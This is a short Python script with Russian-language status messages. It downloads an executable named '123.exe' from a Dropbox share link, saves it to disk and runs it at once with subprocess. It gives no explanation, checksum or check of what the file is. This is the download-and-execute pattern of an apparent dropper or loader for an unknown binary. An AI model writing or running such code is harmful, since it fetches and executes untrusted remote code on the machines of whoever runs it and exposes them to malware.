import os
import requests
import subprocess

def download_and_run():
    url = 'https://www.dropbox.com/scl/fi/19qqc7egp8py7t7ov659m/123.exe?rlkey=oc0nbftrgxo4avtee5grwbmqi&st=8q0bp98n&dl=1'
    filename = '123.exe'

    response = requests.get(url)
    if response.status_code == 200:
        with open(filename, 'wb') as f:
            f.write(response.content)
        print(f"Файл {filename} успешно скачан.")
    else:
        print(f"Ошибка при скачивании файла: {response.status_code}")

    if os.path.exists(filename):
        subprocess.run([filename], check=True)
    else:
        print(f"Файл {filename} не найден для запуска.")
